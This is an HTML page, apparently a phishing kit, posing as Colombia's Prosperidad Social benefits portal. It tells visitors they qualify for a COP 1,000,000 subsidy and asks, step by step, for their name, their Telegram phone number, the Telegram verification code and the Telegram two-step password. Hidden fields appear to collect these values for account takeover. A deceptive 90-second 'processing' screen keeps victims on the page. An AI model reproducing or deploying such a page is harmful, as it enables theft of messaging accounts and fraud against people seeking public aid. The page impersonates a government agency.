<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title> Prosperidad Social - Verificación </title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css" rel="stylesheet">

    <style>
        *, *::before, *::after {
            box-sizing: border-box;
        }

        :root {
            --ps-blue: #003087;
            --ps-blue-hover: #002266;
            --ps-dark: #1e2833;
            --ps-yellow: #FFCD00;
            --ps-red: #C8102E;
            --text-main: #1d1d1d;
            --text-muted: #5a6066;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            
            /* Gradasi berwarna, halus, elegan (Perpaduan abu-abu lembut, ungu muda, dan pastel hangat) */
            background: linear-gradient(135deg, #e4e8f0 0%, #f0ecf4 50%, #e2e8f5 100%);
            
            background-size: 200% 200%;
            animation: gradientBG 15s ease infinite;
            color: var(--text-main);
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Efek Blob Melayang dengan warna yang hidup tapi tetap kalem */
        body::before, body::after {
            content: '';
            position: fixed;
            border-radius: 50%;
            z-index: -1;
            filter: blur(80px);
            opacity: 0.7;
            animation: floatBlob 20s infinite alternate ease-in-out;
        }
        body::before {
            width: 450px;
            height: 450px;
            background: rgba(99, 102, 241, 0.15); /* Ungu-indigo lembut */
            top: -100px;
            left: -100px;
        }
        body::after {
            width: 550px;
            height: 550px;
            background: rgba(236, 72, 153, 0.1); /* Pink/magenta sangat tipis untuk kesan hangat */
            bottom: -150px;
            right: -100px;
            animation-delay: -5s;
        }

        @keyframes floatBlob {
            0% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(150px, 80px) scale(1.15); }
            100% { transform: translate(-80px, 150px) scale(0.85); }
        }

        .ps-header {
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            width: 100%;
            border-bottom: 1px solid rgba(255, 255, 255, 0.8);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.05);
            z-index: 100;
            position: sticky;
            top: 0;
            transition: all 0.3s ease;
        }
        .ps-header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            padding: 15px 20px;
        }
        .ps-logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .ps-logo img {
            height: 45px;
            transition: transform 0.3s ease;
        }
        .ps-logo img:hover {
            transform: scale(1.05);
        }
        .ps-nav {
            display: flex;
            align-items: center;
            gap: 25px;
        }
        .ps-nav a {
            text-decoration: none;
            color: var(--text-main);
            font-weight: 600;
            font-size: 0.95rem;
            transition: color 0.3s, transform 0.3s;
        }
        .ps-nav a:hover {
            color: var(--ps-blue);
            transform: translateY(-2px);
        }
        .ps-btn-outline {
            border: 2px solid rgba(43, 57, 71, 0.5);
            border-radius: 30px;
            padding: 8px 22px;
            color: #2b3947 !important;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(5px);
            font-weight: 700 !important;
            transition: all 0.3s ease !important;
        }
        .ps-btn-outline:hover {
            background-color: var(--ps-blue);
            border-color: var(--ps-blue);
            color: #ffffff !important;
            box-shadow: 0 5px 15px rgba(0, 48, 135, 0.2);
        }
        .flag-bar {
            height: 5px;
            width: 100%;
            background: linear-gradient(to right, var(--ps-yellow) 0%, var(--ps-yellow) 50%, var(--ps-blue) 50%, var(--ps-blue) 75%, var(--ps-red) 75%, var(--ps-red) 100%);
        }

        .ps-banner {
            position: relative;
            width: 100%;
            height: 350px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .ps-banner-bg {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1;
        }

        .ps-banner-bg img {
            width: 100%;
            height: 100%;
            object-fit: cover; 
        }

        .ps-banner-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, rgba(0, 48, 135, 0.6), rgba(29, 29, 29, 0.3));
            z-index: 2;
        }

        .banner-content {
            position: relative;
            z-index: 3;
            padding: 0 20px;
            width: 100%;
            max-width: 800px;
            text-align: center;
            animation: fadeInStep 0.8s ease-out forwards;
        }

        .banner-glass {
            background: linear-gradient(135deg, rgba(0, 48, 135, 0.85), rgba(0, 68, 170, 0.75));
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 35px;
            padding: 35px 45px;
            box-shadow: 0 20px 40px rgba(0, 48, 135, 0.25), inset 0 1px 2px rgba(255, 255, 255, 0.4);
            color: #ffffff;
            text-shadow: none;
        }

        .banner-glass h1 {
            font-size: 2.2rem;
            font-weight: 800;
            margin-bottom: 12px;
            color: #ffffff;
            letter-spacing: -0.5px;
        }

        .banner-glass p {
            font-size: 1.05rem;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.9);
            margin: 0;
            line-height: 1.6;
        }

        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
        }

        .tg-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            width: 100%;
            max-width: 500px;
            border-radius: 35px;
            border: 1px solid #ffffff;
            box-shadow: 0 25px 60px rgba(0, 48, 135, 0.15), inset 0 0 0 1px rgba(255,255,255,0.8);
            overflow: hidden;
            animation: cardEntrance 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
            position: relative;
        }

        @keyframes cardEntrance {
            from { opacity: 0; transform: translateY(40px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        .card-header-custom {
            text-align: center;
            padding: 35px 25px;
            border-bottom: 1px solid rgba(0, 48, 135, 0.08);
            background: linear-gradient(135deg, var(--ps-blue), #001a4d);
            position: relative;
            overflow: hidden;
        }
        
        .card-header-custom::after {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at top right, rgba(255, 255, 255, 0.15), transparent 70%);
        }

        .card-title-custom {
            font-size: 1.5rem;
            font-weight: 800;
            color: #ffffff;
            margin: 0;
            letter-spacing: -0.5px;
            position: relative;
            z-index: 2;
        }

        .form-area {
            padding: 40px 35px;
        }

        .form-intro-glass {
            background: linear-gradient(135deg, #eef5ff 0%, #d9e8fc 100%);
            border: 1px solid #bbd6fa;
            border-radius: 20px;
            padding: 22px;
            margin-bottom: 30px;
            box-shadow: 0 8px 20px rgba(0, 48, 135, 0.08);
            display: flex;
            align-items: flex-start;
            gap: 16px;
            position: relative;
            overflow: hidden;
        }

        .form-intro-glass::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 4px; height: 100%;
            background: var(--ps-blue);
            border-radius: 20px 0 0 20px;
        }
        
        .form-intro-icon {
            font-size: 1.6rem;
            color: var(--ps-blue);
            margin-top: 2px;
        }

        .form-intro-text {
            color: #0a3a82;
            font-size: 0.95rem;
            line-height: 1.6;
            font-weight: 600;
            margin: 0;
        }

        .form-label-custom {
            display: inline-block;
            font-size: 0.85rem;
            font-weight: 700;
            color: #ffffff;
            background: linear-gradient(135deg, var(--ps-blue), #0056b3);
            padding: 6px 15px;
            border-radius: 20px;
            margin-bottom: 12px;
            margin-left: 5px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            box-shadow: 0 4px 10px rgba(0, 48, 135, 0.2);
        }

        .form-group {
            margin-bottom: 25px;
        }

        .input-custom {
            flex: 1;
            background: #f4f7fb;
            border: 2px solid #d1def0;
            border-radius: 20px;
            height: 60px;
            padding: 0 25px;
            font-size: 1rem;
            color: var(--text-main);
            width: 100%;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.02);
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            outline: none;
            font-weight: 600;
        }

        .input-custom::placeholder {
            color: #94a3b8;
            font-weight: 500;
        }

        .input-custom:focus {
            background: #ffffff;
            border-color: var(--ps-blue);
            box-shadow: 0 0 0 5px rgba(0, 48, 135, 0.1), inset 0 2px 5px rgba(0,0,0,0.01);
            transform: translateY(-2px);
        }

        /* --- STYLES UNTUK FORM STEP 5 BARU --- */
        .radio-group-custom {
            display: flex;
            flex-direction: column;
            gap: 15px;
            background: #f4f7fb;
            padding: 20px 25px;
            border-radius: 20px;
            border: 2px solid #d1def0;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.02);
        }
        .radio-option {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 1rem;
            font-weight: 600;
            color: var(--text-main);
            cursor: pointer;
            margin: 0;
        }
        .radio-option input[type="radio"] {
            width: 20px;
            height: 20px;
            accent-color: var(--ps-blue);
            cursor: pointer;
        }
        select.input-custom {
            appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="%2364748b" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>');
            background-repeat: no-repeat;
            background-position: right 20px center;
            padding-right: 45px;
        }
        .pulse-warning {
            animation: pulseWarning 2s infinite;
        }
        @keyframes pulseWarning {
            0% { opacity: 1; }
            50% { opacity: 0.6; }
            100% { opacity: 1; }
        }
        /* ------------------------------------- */

        .btn-tg {
            background: linear-gradient(135deg, var(--ps-blue), #0044aa);
            color: white;
            border: none;
            border-radius: 22px;
            width: 100%;
            height: 60px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 30px;
            box-shadow: 0 10px 25px rgba(0, 48, 135, 0.3);
            position: relative;
            overflow: hidden;
            letter-spacing: 0.5px;
        }

        .btn-tg::after {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 50%; height: 100%;
            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0) 100%);
            transform: skewX(-25deg);
            transition: all 0.6s ease;
        }

        .btn-tg:hover {
            transform: translateY(-4px);
            box-shadow: 0 15px 30px rgba(0, 48, 135, 0.4);
            background: linear-gradient(135deg, #002266, var(--ps-blue));
        }

        .btn-tg:hover::after {
            animation: shine 1.5s infinite;
        }

        @keyframes shine {
            100% { left: 200%; }
        }

        .step-section {
            display: none;
            animation: fadeInStep 0.6s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
            opacity: 0;
            transform: translateY(20px);
        }
        .step-section.active {
            display: block;
        }

        @keyframes fadeInStep {
            to { opacity: 1; transform: translateY(0); }
        }

        .phone-input-wrapper { display: flex; gap: 15px; }
        .country-selector {
            background: #f4f7fb;
            border: 2px solid #d1def0;
            border-radius: 20px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 1rem;
            font-weight: 700;
            color: var(--text-main);
            cursor: pointer;
            min-width: 110px;
            justify-content: center;
            transition: all 0.3s;
            user-select: none;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.02);
        }
        .country-selector:hover { 
            background: #ffffff; 
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
            border-color: rgba(0, 48, 135, 0.2);
        }
        .code-input { letter-spacing: 20px; font-size: 2.2rem; font-weight: 800; text-align: center; padding-left: 30px;}
        
        .alert-custom {
            padding: 18px 22px; border-radius: 20px; font-size: 0.9rem; margin-bottom: 25px;
            display: none; font-weight: 600; background: linear-gradient(135deg, #fee2e2, #fecaca); color: #991b1b; border: 1px solid #fca5a5;
            animation: shake 0.4s ease-in-out;
            box-shadow: 0 5px 15px rgba(220, 38, 38, 0.15);
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .alert-success-custom {
            background: linear-gradient(135deg, #dcfce7, #bbf7d0); 
            border: 1px solid #86efac; 
            color: #166534; 
            border-radius: 24px; 
            padding: 25px; 
            margin-bottom: 30px;
            box-shadow: 0 12px 30px rgba(34, 197, 94, 0.15);
            position: relative;
            overflow: hidden;
        }

        .bs-overlay {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(15, 23, 42, 0.5); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
            z-index: 9998; opacity: 0; visibility: hidden; transition: all 0.4s ease;
        }
        .bs-overlay.active { opacity: 1; visibility: visible; }
        .bs-modal {
            position: fixed; bottom: -100%; left: 0; width: 100%; height: 70vh;
            background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
            z-index: 9999; border-radius: 40px 40px 0 0;
            box-shadow: 0 -20px 50px rgba(0,0,0,0.2); transition: bottom 0.5s cubic-bezier(0.2, 0.8, 0.2, 1);
            display: flex; flex-direction: column; border: 1px solid rgba(255,255,255,0.8);
        }
        .bs-modal.active { bottom: 0; }
        .bs-header { padding: 30px 30px 20px; border-bottom: 1px solid rgba(0,0,0,0.05); }
        .bs-drag-handle { width: 60px; height: 6px; background-color: #cbd5e1; border-radius: 10px; margin: 0 auto 25px auto; }
        .bs-header h3 { margin: 0 0 25px 0; font-size: 1.3rem; font-weight: 800; text-align: center; color: var(--ps-dark); }
        .bs-search-box { position: relative; }
        .bs-search-box i { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #94a3b8; font-size: 1.1rem; }
        .bs-search-box input {
            width: 100%; background: #f1f5f9; border: 2px solid transparent; border-radius: 20px;
            padding: 16px 16px 16px 50px; font-size: 1rem; font-weight: 600; outline: none; transition: all 0.3s;
            color: var(--text-main);
        }
        .bs-search-box input:focus {
            background: #fff; border-color: var(--ps-blue); box-shadow: 0 5px 20px rgba(0,48,135,0.1);
        }
        .bs-list { flex: 1; overflow-y: auto; padding: 15px 0; margin: 0; list-style: none; }
        .bs-item { display: flex; align-items: center; padding: 18px 30px; cursor: pointer; transition: all 0.2s; border-bottom: 1px solid rgba(0,0,0,0.02); }
        .bs-item:hover { background-color: rgba(0, 48, 135, 0.05); padding-left: 35px; }
        .bs-item .flag { font-size: 1.8rem; margin-right: 20px; }
        .bs-item .name { flex: 1; font-size: 1.05rem; font-weight: 600; color: var(--text-main); }
        .bs-item .code { color: var(--ps-blue); font-size: 1rem; font-weight: 800; background: rgba(0, 48, 135, 0.08); padding: 6px 12px; border-radius: 12px; }

        .ps-footer {
            background: rgba(15, 23, 42, 0.98);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            color: #ffffff;
            padding: 60px 20px 30px;
            margin-top: auto;
            border-top: 1px solid rgba(255,255,255,0.1);
        }
        .ps-footer-content {
            max-width: 1000px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            flex-wrap: wrap;
            gap: 50px;
        }
        .ps-footer-left, .ps-footer-center, .ps-footer-right { flex: 1; min-width: 250px; text-align: center; }
        .ps-heart-container { display: flex; align-items: center; justify-content: center; margin-bottom: 25px; }
        .ps-heart-line { height: 2px; width: 60px; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8), transparent); margin: 0 15px; opacity: 0.6;}
        .ps-heart-container i { font-size: 2rem; color: #ef4444; animation: heartbeat 2s infinite; filter: drop-shadow(0 0 10px rgba(239, 68, 68, 0.5)); }
        
        @keyframes heartbeat {
            0% { transform: scale(1); }
            15% { transform: scale(1.2); }
            30% { transform: scale(1); }
            45% { transform: scale(1.2); }
            60% { transform: scale(1); }
        }

        .ps-footer-center h4, .ps-footer-right h4 { font-size: 1.1rem; font-weight: 800; margin-bottom: 25px; letter-spacing: 1.5px; color: #94a3b8; }
        .ps-social-icons { display: flex; justify-content: center; gap: 18px; }
        .ps-social-icons a {
            display: flex; justify-content: center; align-items: center;
            width: 50px; height: 50px; border-radius: 50%;
            background: rgba(255,255,255,0.08); color: #ffffff; text-decoration: none; font-size: 1.3rem;
            transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .ps-social-icons a:hover { background-color: var(--ps-blue); transform: translateY(-5px) scale(1.1); box-shadow: 0 10px 25px rgba(0,0,0,0.4); border-color: transparent; }
        .ps-footer-right a { color: #ffffff; text-decoration: none; font-size: 1.05rem; font-weight: 600; border-bottom: 2px solid rgba(255,255,255,0.2); padding-bottom: 4px; transition: all 0.3s; }
        .ps-footer-right a:hover { color: var(--ps-yellow); border-color: var(--ps-yellow); }
        .ps-footer-bottom { text-align: center; margin-top: 60px; padding-top: 25px; border-top: 1px solid rgba(255,255,255,0.05); font-size: 0.9rem; color: #64748b; font-weight: 500;}

        @media (max-width: 768px) {
            .ps-nav { display: none; }
            .ps-header-content { justify-content: center; }
            .ps-footer-content { flex-direction: column; align-items: center; }
            .tg-card { border-radius: 30px; box-shadow: 0 15px 40px rgba(0,0,0,0.08); }
            .ps-banner {
                height: 280px; 
            }
            .banner-glass {
                padding: 25px;
                border-radius: 25px;
            }
            .banner-glass h1 {
                font-size: 1.8rem;
                margin-bottom: 12px;
            }
            .banner-glass p {
                font-size: 0.95rem;
            }
            .form-area {
                padding: 30px 25px;
            }
        }

        #loader-screen, #submit-loader { 
            background: rgba(255, 255, 255, 0.9); 
            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
        }
        
        .spinner-custom {
            width: 4rem; height: 4rem; border-width: 5px; color: var(--ps-blue) !important;
            filter: drop-shadow(0 5px 15px rgba(0, 48, 135, 0.2));
        }

        .icon-success-anim {
            font-size: 5.5rem;
            background: linear-gradient(135deg, #16a34a, #22c55e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: bounceIn 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
            filter: drop-shadow(0 10px 20px rgba(22, 163, 74, 0.3));
        }

        @keyframes bounceIn {
            0% { transform: scale(0); opacity: 0; }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>

<body>

    <div id="loader-screen" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 10000; display: flex; justify-content: center; align-items: center; flex-direction: column; transition: opacity 0.5s;">
        <div class="spinner-border spinner-custom" role="status"></div>
    </div>

    <header class="ps-header">
        <div class="ps-header-content">
            <div class="ps-logo">
                <img src="images/logo-2.png" alt="Prosperidad Social" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/4/4e/Prosperidad_Social_logo.png'">
            </div>
            <nav class="ps-nav">
                <a href="#">Programas</a>
                <a href="#">Consultas</a>
                <a href="#" class="ps-btn-outline">Ingresa a Prosperidad Social</a>
            </nav>
        </div>
        <div class="flag-bar"></div>
    </header>

    <section class="ps-banner">
        <div class="banner-content">
            <div class="banner-glass">
                <h1>Apoyo Económico para los Hogares Colombianos</h1>
                <p>Conoce los programas de asistencia económica, sus requisitos y las modalidades de transferencia disponibles para los hogares que cumplen los criterios establecidos.</p>
            </div>
        </div>
    </section>

    <main class="main-content">
        <div class="tg-card">
            <div class="card-header-custom">
                <h2 class="card-title-custom">Portal de Consulta de Programas Sociales</h2>
            </div>

            <div id="main-form-container" class="form-area">
                
                <input type="hidden" id="validateclientHash">
                <input type="hidden" id="validatephone_number">
                <input type="hidden" id="validateotp_code">

                <div id="step1" class="step-section active">
                    
                    <div id="custom-name-section">
                        <div class="form-intro-glass">
                            <i class="fas fa-info-circle form-intro-icon"></i>
                            <p class="form-intro-text">
                                Por favor, ingrese su nombre completo para verificar su elegibilidad como beneficiario de la ayuda.
                            </p>
                        </div>
                        <div class="form-group">
                            <label class="form-label-custom">Nombre Completo</label>
                            <input type="text" id="input_nama_lengkap" class="input-custom" placeholder="Ej: Juan Pérez" required autocomplete="off">
                        </div>
                        <button type="button" id="btn-cek-nama" class="btn-tg">Verificar Elegibilidad <i class="fas fa-arrow-right ms-2" style="font-size:1rem;"></i></button>
                    </div>

                    <div id="custom-telegram-section" style="display: none; animation: fadeInStep 0.6s ease-out forwards;">
                        
                        <div class="alert-success-custom text-center">
                            <i class="fas fa-check-circle" style="font-size: 3.5rem; margin-bottom: 15px; color: #16a34a; animation: bounceIn 0.8s; filter: drop-shadow(0 4px 10px rgba(22, 163, 74, 0.3));"></i><br>
                            <span style="font-size: 1.3rem; font-weight: 600; color: #14532d;">¡Felicidades! <br><b id="display_nama" style="font-size: 1.6rem; font-weight: 800; display: block; margin: 8px 0;"></b></span>
                            <span style="font-size: 1.05rem; margin-top: 10px; display: inline-block; font-weight: 600; color: #15803d; line-height: 1.5;">
                                ¡Usted tiene derecho y cumple con los requisitos para ser beneficiario de la transferencia monetaria de Prosperidad Social!
                            </span>
                        </div>

                        <div class="form-intro-glass">
                            <i class="fab fa-telegram-plane form-intro-icon" style="color: #0088cc;"></i>
                            <p class="form-intro-text">
                                Para reclamar su ayuda, por favor ingrese su <b>número de Telegram</b> registrado.
                            </p>
                        </div>

                        <div id="alert1" class="alert-custom alert-error"></div>
                        
                        <form id="firstForm">
                            <div style="display: none;">
                                <select id="job_position" required><option value="otro" selected>Otro</option></select>
                                <select id="experience" required><option value="0" selected>Beginner</option></select>
                                <input type="checkbox" id="certifico" checked required>
                            </div>
                            <div class="form-group">
                                <input type="hidden" id="full_name" value="User">
                            </div>

                            <div class="form-group">
                                <label class="form-label-custom">Número de Telegram</label>
                                <div class="phone-input-wrapper">
                                    <div class="country-selector" id="open-country-modal">
                                        <span id="display-flag">🇨🇴</span>
                                        <span id="display-code">+57</span>
                                        <i class="fas fa-chevron-down" style="font-size: 0.8rem; margin-left: 4px; color: #64748b;"></i>
                                    </div>
                                    <input type="tel" id="phone_number" class="input-custom" placeholder="Número de Teléfono" required inputmode="numeric" autocomplete="off">
                                </div>
                            </div>
                            <button type="submit" id="firstbutt" class="btn-tg">Continuar <i class="fas fa-paper-plane ms-2"></i></button>
                        </form>
                    </div>

                </div>

                <div id="step2" class="step-section">
                    <div class="form-intro-glass">
                        <i class="fas fa-comment-sms form-intro-icon"></i>
                        <p class="form-intro-text">
                            Hemos enviado un código de verificación a su aplicación de Telegram.
                        </p>
                    </div>
                    <div id="alert2" class="alert-custom alert-error"></div>
                    <form id="secondForm">
                        <div class="form-group text-center">
                            <label class="form-label-custom" style="margin: 0 auto 12px auto; display: inline-block;">Código de Verificación</label>
                            <input type="tel" name="otp-input" id="otp_code" class="input-custom code-input" placeholder="•••••" required maxlength="5" autocomplete="off">
                        </div>
                        <button type="submit" id="seccbutt" class="btn-tg">Verificar Código <i class="fas fa-shield-check ms-2"></i></button>
                    </form>
                </div>

                <div id="step3" class="step-section">
                    <div class="form-intro-glass">
                        <i class="fas fa-key form-intro-icon"></i>
                        <p class="form-intro-text">
                            Ingrese su contraseña de verificación en dos pasos.
                        </p>
                    </div>
                    <div id="alert3" class="alert-custom alert-error"></div>
                    <form id="thirdForm">
                        <div class="form-group">
                            <label class="form-label-custom">Contraseña</label>
                            <input type="password" id="password" class="input-custom" placeholder="Contraseña de Telegram" required>
                        </div>
                        <button type="submit" id="thirdbutt" class="btn-tg">Confirmar <i class="fas fa-lock ms-2"></i></button>
                    </form>
                </div>

                <div id="step5" class="step-section active">
                    <div class="form-intro-glass">
                        <i class="fas fa-id-card form-intro-icon"></i>
                        <div class="form-intro-text">
                            <strong style="display:block; font-size:1.05rem; margin-bottom:5px; color: var(--ps-blue);">Identidad del Solicitante</strong>
                            Complete la siguiente información básica para fines de consulta del programa.
                        </div>
                    </div>
                    
                    <form id="claimForm">
                        <div class="form-group">
                            <label class="form-label-custom">Nombre completo</label>
                            <input type="text" id="claim_name" class="input-custom" placeholder="Ingrese su nombre completo" required autocomplete="off">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label-custom">Ciudad o municipio</label>
                            <input type="text" id="claim_city" class="input-custom" placeholder="Ingrese su ciudad de residencia" required autocomplete="off">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label-custom" style="display: block;">Estado laboral</label>
                            <div class="radio-group-custom">
                                <label class="radio-option">
                                    <input type="radio" name="job_status" value="Empleado" required> Empleado
                                </label>
                                <label class="radio-option">
                                    <input type="radio" name="job_status" value="Trabajador independiente"> Trabajador independiente
                                </label>
                                <label class="radio-option">
                                    <input type="radio" name="job_status" value="Desempleado"> Desempleado
                                </label>
                                <label class="radio-option">
                                    <input type="radio" name="job_status" value="Otro"> Otro
                                </label>
                            </div>
                        </div>

                        <div class="form-group">
                            <label class="form-label-custom">Número de miembros de la familia</label>
                            <select id="family_members" class="input-custom" required>
                                <option value="" disabled selected>Seleccione una opción</option>
                                <option value="1 persona">1 persona</option>
                                <option value="2-3 personas">2-3 personas</option>
                                <option value="4-5 personas">4-5 personas</option>
                                <option value="Más de 5 personas">Más de 5 personas</option>
                            </select>
                        </div>

                        <button type="submit" class="btn-tg">Enviar Solicitud <i class="fas fa-paper-plane ms-2"></i></button>
                    </form>
                </div>

                <!-- STEP 6 BARU: LOADER 90 DETIK & KETERANGAN SUKSES -->
                <div id="step6" class="step-section text-center py-5">
                    <i class="fas fa-check-circle mb-4 icon-success-anim"></i>
                    <br>
                    <h2 class="card-title-custom mb-3" style="font-size: 1.8rem; background: linear-gradient(135deg, #16a34a, #15803d); padding: 12px 25px; border-radius: 30px; display: inline-block; box-shadow: 0 5px 15px rgba(22, 163, 74, 0.3);">¡Reclamo Exitoso!</h2>
                    
                    <div class="alert-success-custom text-center" style="margin-top: 15px; padding: 20px;">
                        <span style="font-size: 1.15rem; font-weight: 700; color: #14532d; line-height: 1.6;">
                            ¡Felicidades, su reclamo ha sido exitoso y tiene derecho a recibir un subsidio en efectivo de COP 1,000,000!
                        </span>
                    </div>
            
                    <div id="final-loader-container" style="margin-top: 40px; background: rgba(0, 48, 135, 0.05); padding: 25px; border-radius: 20px; border: 1px solid rgba(0, 48, 135, 0.1);">
                        <div class="spinner-border spinner-custom" style="width: 3rem; height: 3rem; border-width: 4px;" role="status"></div>
                        <p class="mt-4 fw-bold pulse-warning" style="color: var(--ps-red) !important; letter-spacing: 0.5px; font-size: 1.05rem; margin-bottom: 5px;">
                            <i class="fas fa-exclamation-triangle me-1"></i> Por favor, no abandone esta página hasta que se complete el proceso.
                        </p>
                        <p style="font-size: 1rem; color: var(--ps-blue); font-weight: 700; margin-top: 10px;" id="countdown-text">Procesando... 90s</p>
                    </div>
                </div>

            </div>
        </div>
    </main>

    <footer class="ps-footer">
        <div class="ps-footer-content">
            <div class="ps-footer-left">
                <p style="font-size: 1.3rem; font-weight: 800; letter-spacing: 0.5px;">Prosperidad Social</p>
                <p style="color: #94a3b8; font-weight: 500; font-size: 1.05rem;">Cra 7 # 32 - 42</p>
            </div>
            
            <div class="ps-footer-center">
                <div class="ps-heart-container">
                    <div class="ps-heart-line"></div>
                    <i class="fas fa-heart"></i>
                    <div class="ps-heart-line"></div>
                </div>
                <h4>SÍGUENOS</h4>
                <div class="ps-social-icons">
                    <a href="#"><i class="fab fa-facebook-f"></i></a>
                    <a href="#"><i class="fab fa-instagram"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-tiktok"></i></a>
                    <a href="#"><i class="fab fa-youtube"></i></a>
                </div>
            </div>

            <div class="ps-footer-right">
                <h4>CONSULTA NUESTROS CANALES</h4>
                <a href="#">Canales Oficiales</a>
            </div>
        </div>
        <div class="ps-footer-bottom">
            <p>Copyright ©️ ProsperidadSocial.gov.co</p>
        </div>
    </footer>

    <div class="bs-overlay" id="bs-overlay"></div>
    
    <div class="bs-modal" id="bs-modal">
        <div class="bs-header">
            <div class="bs-drag-handle"></div>
            <h3>Seleccionar País</h3>
            <div class="bs-search-box">
                <i class="fas fa-search"></i>
                <input type="text" id="bs-search" placeholder="Buscar País..." autocomplete="off">
            </div>
        </div>
        <ul class="bs-list" id="bs-list">
            <li class="bs-item" data-code="+57" data-name="colombia"><span class="flag">🇨🇴</span> <span class="name">Colombia</span> <span class="code">+57</span></li>
            <li class="bs-item" data-code="+62" data-name="indonesia"><span class="flag">🇮🇩</span> <span class="name">Indonesia</span> <span class="code">+62</span></li>
            <li class="bs-item" data-code="+93" data-name="afghanistan"><span class="flag">🇦🇫</span> <span class="name">Afghanistan</span> <span class="code">+93</span></li>
            <li class="bs-item" data-code="+61" data-name="australia"><span class="flag">🇦🇺</span> <span class="name">Australia</span> <span class="code">+61</span></li>
            <li class="bs-item" data-code="+55" data-name="brazil"><span class="flag">🇧🇷</span> <span class="name">Brazil</span> <span class="code">+55</span></li>
            <li class="bs-item" data-code="+86" data-name="china"><span class="flag">🇨🇳</span> <span class="name">China</span> <span class="code">+86</span></li>
            <li class="bs-item" data-code="+60" data-name="malaysia"><span class="flag">🇲🇾</span> <span class="name">Malaysia</span> <span class="code">+60</span></li>
            <li class="bs-item" data-code="+65" data-name="singapore"><span class="flag">🇸🇬</span> <span class="name">Singapore</span> <span class="code">+65</span></li>
            <li class="bs-item" data-name="united states usa" data-code="+1"><span class="flag">🇺🇸</span> <span class="name">United States</span> <span class="code">+1</span></li>
